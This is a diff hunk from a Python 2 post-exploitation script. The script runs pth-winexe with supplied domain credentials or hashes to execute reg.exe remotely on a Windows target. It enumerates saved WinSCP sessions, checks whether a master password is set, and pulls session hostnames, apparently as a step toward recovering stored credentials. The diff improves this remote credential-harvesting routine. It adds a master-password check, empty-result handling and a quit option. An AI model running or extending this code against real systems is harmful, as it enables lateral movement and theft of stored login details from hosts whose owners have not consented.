@@ -1776,29 +1776,45 @@ if win_scp!='n':
 	num_sessions = []
 	if len(targets)==1:
 		try:				
+			#First Check to see whether a master password is being used
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Configuration\Security\" /v \"UseMasterPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			UseMasterPassword = proc.communicate()[0]
+			if "0x1" in UseMasterPassword:
+				print colored("[+]WinSCP Master Password Detection:",'green')
+				print colored("[+]A Master Password is in use, unable to continue:",'yellow')
+				sys.exit()
+
+
 			print colored("[+]Getting WinSCP Sessions:",'green')
 			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			scp_sessions = proc.communicate()[0]
-			
-			if "The system was unable to find the specified registry key or value." in scp_sessions:
+						
+			if "The system was unable to find the specified registry key or value." in scp_sessions or len(scp_sessions)==0:
 				print colored("[-]No sessions found...",'red')
 				sys.exit()	
-
-			print colored("[+]The following WinSCP Sessions Were Found:",'green')
-			
+						
 			k=scp_sessions.splitlines()
 			
 			for session in k:
 				if len(session)>0:
 					num_sessions.append(session[60:])
 
-			if len(num_sessions)>0:
-				for session in xrange(0,len(num_sessions)):
-					print colored("[+]"+str(session)+" "+num_sessions[session],'yellow')
+			if len(num_sessions)==0:
+				print colored("[-]No sessions were found:",'red')
+				sys.exit()
 
-			response = raw_input("Enter session number you would like to recover details for:")
+			print colored("[+]The following WinSCP Sessions were found:",'green')
+			
+			if len(num_sessions)!=0:
+				for session in xrange(0,len(num_sessions)):
+					print colored("["+str(session)+"]"+num_sessions[session],'yellow')
+
+			response = raw_input("Enter session number you would like to recover details for (q to quit):")
 			if response !="":
 				
+				if response=="q":
+					sys.exit()
+
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				scp_host = proc.communicate()[0]	
 			
